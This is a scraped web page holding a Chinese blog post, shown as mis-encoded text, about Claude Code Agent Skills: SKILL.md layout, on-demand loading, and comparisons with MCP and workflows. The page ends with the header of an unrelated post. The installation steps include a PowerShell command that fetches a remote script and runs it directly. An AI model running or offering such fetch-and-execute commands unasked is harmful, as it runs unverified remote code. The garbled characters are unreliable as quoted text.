            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3650034333917031/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    KaneLogger
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T15:27:55.000Z" title="Tue Jan 20 2026 15:27:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/64133b5a33e94c4cbd00e99de984ec98~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527674&amp;x-signature=xS6hZWJ6Bvp8rMPyKLA4oQqWFYI%3D" alt="Agent_Skills_Progressive_Capability_Encapsulation-å›¾ç‰‡-0.jpg" loading="lazy"/></p>
<h2 data-id="heading-0">Agent Skills æ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<p>Agent Skills æœ¬è´¨ä¸Šæ˜¯ä¸€ç§æ¸è¿›å¼æŠ«éœ²çš„æç¤ºè¯æœºåˆ¶ã€‚
æˆ‘ç†è§£ Skills å…¶å®æ˜¯ä¸€ç§ä¸Šä¸‹æ–‡å·¥ç¨‹ã€‚Skills åªæ˜¯æŠŠå‚ç›´é¢†åŸŸçš„çŸ¥è¯†ã€è„šæœ¬è°ƒç”¨æ–¹æ³•ç­‰æŒ‚è½½åˆ° Agent çš„ä¸Šä¸‹æ–‡çª—å£ã€‚</p>
<p>Skills å°†æç¤ºè¯æ‹†è§£ä¸ºä¸‰ä¸ªå±‚çº§ï¼Œé€šè¿‡â€œæŒ‰éœ€åŠ è½½â€é™ä½ Token æ¶ˆè€—ä¸å¤æ‚åº¦ï¼š</p>
<ul>
<li>å…ƒæ•°æ®ï¼š å¿…é¡»åŠ è½½ã€‚ç±»ä¼¼ä¹¦çš„â€œç›®å½•â€ã€‚è®© Agent çŸ¥é“æœ‰å“ªäº›æŠ€èƒ½å¯ç”¨ã€‚</li>
<li>æŒ‡ä»¤ï¼š æŒ‰éœ€åŠ è½½ã€‚ç±»ä¼¼ä¹¦çš„â€œæ­£æ–‡â€ã€‚å…·ä½“çš„æ‰§è¡Œæ­¥éª¤å’Œ SOPã€‚</li>
<li>èµ„æºï¼š æŒ‰éœ€åŠ è½½ã€‚ç±»ä¼¼ä¹¦çš„â€œé™„å½•â€ã€‚æ¨¡æ¿ã€æ¡ˆä¾‹ã€è§„èŒƒæ–‡æ¡£ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/49ad196cfc8a485b9f3f47bc5a87c0c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527674&amp;x-signature=3HyvYtUCVm5ZcLCNj6AXUnRaLO0%3D" alt="image.png" loading="lazy"/>
Skill æ–‡ä»¶ç»“æ„ï¼š</p>
<pre><code class="hljs language-sh" lang="sh">/.claude/skills/skill-name
    â”œâ”€â”€ SKILL.md    <span class="hljs-comment"># å…ƒæ•°æ®+æŒ‡ä»¤</span>
    â”œâ”€â”€ scripts/    <span class="hljs-comment"># å¯æ‰§è¡Œè„šæœ¬</span>
    â”‚   â””â”€â”€ main.py
    â”œâ”€â”€ references/ <span class="hljs-comment"># è¡¥å……æ–‡æ¡£ï¼ˆå¯é€‰ï¼‰</span>
    â”‚   â””â”€â”€ doc.md
    â””â”€â”€ assets/     <span class="hljs-comment"># ç´ æèµ„æº</span>
        â””â”€â”€ pic.jpg
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c0e569d5c6304cf196f1aae1187fcb85~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527674&amp;x-signature=GuCFl%2BQDQ5sc0WtxcI7KC4Yr2i0%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-1">SKILL.md åˆ†æ</h3>
<p>meta-data å…ƒæ•°æ®ã€‚æœ€é‡è¦çš„éƒ¨åˆ†ã€‚
æè¿°éƒ¨åˆ†è¿™å—æœ€é‡è¦æ˜¯å†™æ¸…æ¥š AI åº”è¯¥åœ¨ä»€ä¹ˆæ—¶æœºæ¥è°ƒç”¨è¿™ä¸ª Skillã€‚</p>
<pre><code class="hljs language-text" lang="text">---
name: { { æŠ€èƒ½åç§° } }
description: { { æè¿°éƒ¨åˆ† } }
---

{{ æŒ‡ä»¤éƒ¨åˆ† }}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/71c918dcbb2a4348ad4bf490b00384fb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527674&amp;x-signature=CIgSiyWJ121usHPCVAKNOhibSMo%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">è°ƒç”¨è¿‡ç¨‹</h3>
<ol>
<li>ç”¨æˆ· â†’ Claude Codeï¼ˆagentï¼‰: {task}-ç»“åˆææ–™å†™ä½œã€æ ¡å¯¹æ–‡ç« ç”¨è¯ã€‚</li>
<li>Claude Codeï¼ˆagentï¼‰â†’ å¤§æ¨¡å‹ï¼šUser{task};Available Skills: ....</li>
<li>å¤§æ¨¡å‹ â†’ Claude Codeï¼ˆagentï¼‰: Choose Skill: å†™ä½œ</li>
<li>ã€æŒ‡ä»¤å±‚ æŒ‰éœ€åŠ è½½ã€‘Claude Codeï¼ˆagentï¼‰â†’ å¤§æ¨¡å‹ï¼šSKILL.md</li>
<li>ã€èµ„æºå±‚ æŒ‰éœ€åŠ è½½ã€‘å¤§æ¨¡å‹ â†’ Claude Codeï¼ˆagentï¼‰ï¼šRead references/*.md</li>
<li>Claude Codeï¼ˆagentï¼‰â†’ å¤§æ¨¡å‹ï¼šæä¾›references/*.md ä¸­çš„å†…å®¹</li>
<li>å¤§æ¨¡å‹ â†’ ç”¨æˆ·ï¼šæœ€ç»ˆå›ç­”</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9314764b2dc2441c870c468c20ecfbd8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527674&amp;x-signature=gc%2BRGrfFyCw9HOaTZYWfZ5b4glg%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">Agent Skills vs MCP vs Prompt</h3>



































<table><thead><tr><th align="center"/><th align="center">Agent Skills</th><th align="center">MCP</th></tr></thead><tbody><tr><td align="center">ä¾§é‡ç‚¹</td><td align="center">æç¤ºè¯</td><td align="center">å·¥å…·è°ƒç”¨</td></tr><tr><td align="center">ç±»æ¯”</td><td align="center">å¸¦ç›®å½•çš„è¯´æ˜ä¹¦</td><td align="center">æ ‡å‡†åŒ–å·¥å…·ç®±</td></tr><tr><td align="center">Tokenæ¶ˆè€—</td><td align="center">ä½</td><td align="center">é«˜</td></tr><tr><td align="center">æ ¸å¿ƒä¸»ä½“</td><td align="center">SKILL.md</td><td align="center">è½¯ä»¶åŒ…</td></tr><tr><td align="center">ç¼–å†™éš¾åº¦</td><td align="center">ä½</td><td align="center">é«˜</td></tr></tbody></table>
<p>Skills å’Œ MCP æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</p>
<ol>
<li>MCP æ˜¯ä¸€ç§å¼€æ”¾æ ‡å‡†çš„åè®®ï¼Œå…³æ³¨çš„æ˜¯ AI å¦‚ä½•ä»¥ç»Ÿä¸€æ–¹å¼è°ƒç”¨å¤–éƒ¨çš„å·¥å…·ã€æ•°æ®å’ŒæœåŠ¡ï¼Œæœ¬èº«ä¸å®šä¹‰ä»»åŠ¡é€»è¾‘æˆ–æ‰§è¡Œæµç¨‹ã€‚</li>
<li>Skill åˆ™æ•™ Agent å¦‚ä½•å®Œæ•´å¤„ç†ç‰¹å®šå·¥ä½œï¼Œå®ƒå°†æ‰§è¡Œæ–¹æ³•ã€å·¥å…·è°ƒç”¨æ–¹å¼ä»¥åŠç›¸å…³çŸ¥è¯†ææ–™ï¼Œå°è£…ä¸ºä¸€ä¸ªå®Œæ•´çš„ã€Œèƒ½åŠ›æ‰©å±•åŒ…ã€ï¼Œä½¿ Agent å…·å¤‡ç¨³å®šã€å¯å¤ç”¨çš„åšäº‹æ–¹æ³•ã€‚</li>
</ol>
<h3 data-id="heading-4">Agent Skills vs. Workflow å·¥ä½œæµ</h3>
<p>ä¸¤ç§ä¸åŒçš„ç³»ç»Ÿè®¾è®¡å“²å­¦ï¼š</p>
<ul>
<li>Workflow (åˆšæ€§ç³»ç»Ÿ)ï¼š â€œé¢„è®¾è·¯å¾„â€ã€‚åœ¨è®¾è®¡æ—¶æšä¸¾æ‰€æœ‰èŠ‚ç‚¹ä¸è¿æ¥ã€‚ç¨³å®šæ€§é«˜ï¼Œä½†è„†å¼±ï¼Œä¸€æ—¦é‡åˆ°æœªçŸ¥æƒ…å†µå®¹æ˜“å´©æºƒã€‚ç±»ä¼¼äºä¼ ç»Ÿçš„å·¥ä¸šæµæ°´çº¿ã€è´¢åŠ¡å®¡æ‰¹æµç¨‹ã€‚</li>
<li>Agent + Skills (æŸ”æ€§ç³»ç»Ÿ)ï¼š â€œæ¶Œç°è·¯å¾„â€ã€‚è®¾è®¡æ—¶åªå®šä¹‰åŸå­èƒ½åŠ›ï¼ˆSkillsï¼‰ï¼Œè¿è¡Œæ—¶ç”± Agent æ ¹æ®ä¸Šä¸‹æ–‡åŠ¨æ€å†³ç­–æ‰§è¡Œè·¯å¾„ã€‚å…·æœ‰æå¼ºçš„é€‚åº”æ€§å’Œè¿›åŒ–èƒ½åŠ›ï¼Œç±»ä¼¼äºç”Ÿç‰©ç”Ÿæ€ç³»ç»Ÿã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/021bca619e144483aa2d307734bffa3c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527674&amp;x-signature=VS3Cf5hYeM5T0rzZRM4Hk8KyKMY%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-5">æŠ€æœ¯å®ç°</h2>
<p>æ ‡å‡†ç›®å½•ç»“æ„ï¼šåœ¨ <code>/.claude/skills</code> ä¸‹åˆ›å»ºé¡¹ç›®ï¼š</p>
<pre><code class="hljs language-sh" lang="sh">/.claude/skills/skill-name
    â”œâ”€â”€ SKILL.md        <span class="hljs-comment"># æ ¸å¿ƒï¼šå…ƒæ•°æ® + æŒ‡ä»¤</span>
    â”œâ”€â”€ scripts/        <span class="hljs-comment"># å¯é€‰ï¼šå¯æ‰§è¡Œè„šæœ¬ (å¦‚ main.py)</span>
    â”œâ”€â”€ references/     <span class="hljs-comment"># å¯é€‰ï¼šè¡¥å……æ–‡æ¡£ (å¦‚ è§„èŒƒ.md)</span>
    â””â”€â”€ assets/         <span class="hljs-comment"># å¯é€‰ï¼šç´ æèµ„æº (å¦‚ æ¨¡æ¿.jpg)</span>
</code></pre>
<p>SKILL.md ç¼–å†™è§„èŒƒ</p>
<pre><code class="hljs language-text" lang="text">---
name: æ–‡æ¡ˆå¤§å¸ˆ # æŠ€èƒ½åç§°
description: ç”¨äºæ ¹æ®æä¾›çš„ææ–™æ’°å†™ã€æ ¡å¯¹å’Œæ¶¦è‰²æ–‡ç«  # æè¿°ï¼ˆå†³å®š AI ä½•æ—¶è°ƒç”¨ï¼‰
---

# æŒ‡ä»¤éƒ¨åˆ†

è¿™é‡Œå†™è¯¦ç»†çš„ SOPã€æ­¥éª¤è¦æ±‚ã€æ³¨æ„äº‹é¡¹...
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a165a4668394e1aa6f8476f0388d750~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527674&amp;x-signature=1D5yAcNOE0X4LqejRxWfe3isqbo%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-6">å®æˆ˜æŒ‡å—ï¼šä»å®‰è£…åˆ°æ„å»º</h2>
<h3 data-id="heading-7">1.ç¯å¢ƒå‡†å¤‡</h3>
<ul>
<li>å®‰è£… Claude Codeï¼š
<ul>
<li>macOS: <code>brew install --cask claude-code</code></li>
<li>Windows (PowerShell): <code>irm https://claude.ai/install.ps1 | iex</code></li>
</ul>
</li>
</ul>
<h3 data-id="heading-8">2. é…ç½®æ¨¡å‹</h3>
<p>æ¨èä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ffarion1231%2Fcc-switch" target="_blank" title="https://github.com/farion1231/cc-switch" ref="nofollow noopener noreferrer">CC Switch</a> ç®¡ç†æ¨¡å‹ç‰ˆæœ¬ã€‚</p>
<h3 data-id="heading-9">3. åˆ›å»º Skill</h3>
<p>å¦‚ä½•å°†ä¸€ä¸ªä»»åŠ¡è½¬åŒ–ä¸ºé«˜è´¨é‡çš„ Skillï¼Ÿ
å…ˆåˆ¤æ–­æ˜¯å¦æ˜¯éœ€è¦åå¤åšçš„ä»»åŠ¡ï¼Ÿå¦‚æœåªæ˜¯ä¸€æ¬¡å°±æ²¡å¿…è¦åšæˆSkillã€‚å› ä¸º Skill çš„æ ¸å¿ƒä»·å€¼åœ¨äºå¤ç”¨ã€‚
å†åŠ¨æ‰‹åšå‡ éï¼Œæ²‰æ·€æœ€ä½³å®è·µã€‚æ€è€ƒè®°å½•å“ªäº›æ­¥éª¤æ˜¯å›ºå®šçš„ï¼Ÿå“ªäº›åœ°æ–¹å®¹æ˜“å‡ºé—®é¢˜ï¼Ÿä»€ä¹ˆæ ·çš„è¾“å‡ºè´¨é‡æœ€å¥½ï¼Ÿ
å…·ä½“æ“ä½œï¼š
è®© Agent å¸®ä½ åˆ›å»º Skillã€‚æ–°å¼€ä¸€ä¸ªä¼šè¯ï¼Œåœ¨æ”¯æŒ Skills çš„ Agent é‡ŒæŠŠä»»åŠ¡å®Œæ•´åšä¸€éï¼Œåšå®Œåå‘Šè¯‰å®ƒï¼šæŠŠåˆšæ‰çš„æ“ä½œåˆ›å»ºæˆä¸€ä¸ª Skillï¼Œæ–¹ä¾¿ä»¥åå¤ç”¨ã€‚
ç”¨ Skill åšä»»åŠ¡ï¼ŒæŒç»­è¿­ä»£ä¼˜åŒ–ã€‚ä»¥åéƒ½ç”¨è¿™ä¸ª Skill æ¥æ‰§è¡Œä»»åŠ¡ã€‚æ¯æ¬¡å®Œæˆåæ£€æŸ¥è¾“å‡ºï¼Œå“ªé‡Œä¸æ»¡æ„å°±å‘Šè¯‰ Agentï¼Œè®©å®ƒæ”¹è¿›å¹¶æ›´æ–° Skillã€‚</p>
<p>ç®€å•æ¥è¯´å°±æ˜¯ï¼šå…ˆäººå·¥è·‘é€šä¸€éä»»åŠ¡ï¼Œç¡®è®¤ SOP æ— è¯¯åï¼Œå‘Šè¯‰ Agentï¼šâ€œæŠŠåˆšæ‰çš„æ“ä½œåˆ›å»ºæˆä¸€ä¸ª Skillï¼Œæ–¹ä¾¿ä»¥åå¤ç”¨ã€‚â€</p>
<p><strong>å¿«é€Ÿåˆ›å»ºæŠ€å·§</strong></p>
<ul>
<li>äº¤äº’å¼åˆ›å»ºï¼š ä½¿ç”¨ <code>/skill-creator</code> å·¥å…·è¾…åŠ©åˆ›å»ºã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a30dc7c610da48faa46a3fc755bcf245~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527674&amp;x-signature=5tm7BbT0urarv5p7TozcoqKq7xk%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-10">æ·±åº¦æ€è€ƒï¼šSkills çš„é•¿æœŸä»·å€¼</h2>
<p>å…¶å®åœ¨å†™è¿™ç¯‡æ–‡ç« çš„æ—¶å€™æˆ‘å¿ƒé‡Œå°±åœ¨æƒ³ï¼šéšç€æ¨¡å‹å˜å¼ºï¼ŒSkills ä¼šè¿‡æ—¶å—ï¼Ÿ
å†™å®Œä¹‹åæˆ‘å¾—åˆ°äº†ä¸€ä¸ªç­”æ¡ˆæ˜¯ï¼šè‚¯å®šä¼šè¿‡æ—¶ã€‚Skills åªæ˜¯çŸ­æœŸçº¢åˆ©ï¼Œéšç€æ¨¡å‹å˜å¼ºï¼Œå¥½çš„Skillsä¼šå†…ç½®è¿›æ¨¡å‹é‡Œé¢ã€‚
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/502239323741415fad63937c8b9fb8e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527674&amp;x-signature=GEjGk0KL5MBPfVxdw89ZBKa6QbM%3D" alt="image.png" loading="lazy"/>
<strong>Skills æ˜¯çŸ­æœŸçš„çº¢åˆ©ï¼Œä½†â€œèƒ½åŠ›â€æ˜¯é•¿æœŸçš„å£å’ã€‚</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a43faa1bbd774400a5d1e87dd1257755~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527674&amp;x-signature=p6weiV7eoCxHbJZNCpJ6BRRZUxM%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li>å½“ä¸‹çº¢åˆ©ï¼ˆæ•ˆç‡ï¼‰ï¼š Skills æ˜¯å½“å‰æŠ€æœ¯é˜¶æ®µçš„â€œæœ€ä¼˜è§£â€ï¼Œå®ƒæ˜¯å°è£…ç‰¹å®šå·¥ä½œæµçš„äº§å“ï¼Œèƒ½ç›´æ¥å¸¦æ¥ç”Ÿäº§åŠ›æå‡ã€‚</li>
<li>çœŸæ­£å£å’ï¼ˆè®¤çŸ¥ï¼‰ï¼š Skills çš„å…·ä½“å½¢å¼å¯èƒ½ä¼šå˜ï¼ˆæœªæ¥æ¨¡å‹å¯èƒ½ä¸éœ€è¦è¿™ä¹ˆæ˜¾å¼çš„ Skillï¼‰ï¼Œä½†ä½ åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ç»ƒå°±çš„é—®é¢˜æ‹†è§£èƒ½åŠ›ã€æµç¨‹è®¾è®¡èƒ½åŠ›ã€äººæœºååŒç»éªŒï¼Œæ˜¯ä¸ä¼šè´¬å€¼çš„èµ„äº§ã€‚</li>
</ul>
<p>æ‰€ä»¥æˆ‘ä¸åº”è¯¥åªå…³æ³¨åˆ¶ä½œ Skill è¿™ä¸ªåŠ¨ä½œï¼Œè€Œè¦é€šè¿‡åˆ¶ä½œ Skillï¼Œ<strong>æ²‰æ·€è‡ªå·±è§£å†³å¤æ‚é—®é¢˜</strong>çš„æ€ç»´æ¨¡å‹ï¼ŒæŠ•èµ„è‡ªå·±è·¨è¶Šå‘¨æœŸçš„â€œé—®é¢˜è§£å†³èƒ½åŠ›â€ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a5fc99919b844f1ab08d200ff54fc63~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527674&amp;x-signature=aEZ0qrWwf%2FGB%2FOPOBFZszln8Wcc%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Ace Data Cloud æµè§ˆå™¨æ’ä»¶é…ç½®ä¸å†…å®¹å‘å¸ƒ SOPï¼ˆæ ‡å‡†ä½œä¸šç¨‹åºï¼Œå‚åŠ æ´»åŠ¨é€ç§¯åˆ†ï¼‰]]></title>    <link>https://juejin.cn/post/7597266141912727598</link>    <guid>https://juejin.cn/post/7597266141912727598</guid>    <pubDate>2026-01-20T15:44:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597266141912727598" data-draft-id="7597258378590814218" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Ace Data Cloud æµè§ˆå™¨æ’ä»¶é…ç½®ä¸å†…å®¹å‘å¸ƒ SOPï¼ˆæ ‡å‡†ä½œä¸šç¨‹åºï¼Œå‚åŠ æ´»åŠ¨é€ç§¯åˆ†ï¼‰"/> <meta itemprop="keywords" content="API"/> <meta itemprop="datePublished" content="2026-01-20T15:44:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å´”åº†æ‰ä¸¨é™è§…"/> <meta itemprop="url" content="https://juejin.cn/user/1521379821230269"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Ace Data Cloud æµè§ˆå™¨æ’ä»¶é…ç½®ä¸å†…å®¹å‘å¸ƒ SOPï¼ˆæ ‡å‡†ä½œä¸šç¨‹åºï¼Œå‚åŠ æ´»åŠ¨é€ç§¯åˆ†ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1521379821230269/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å´”åº†æ‰ä¸¨é™è§…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T15:44:20.000Z" title="Tue Jan 20 2026 15:44:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
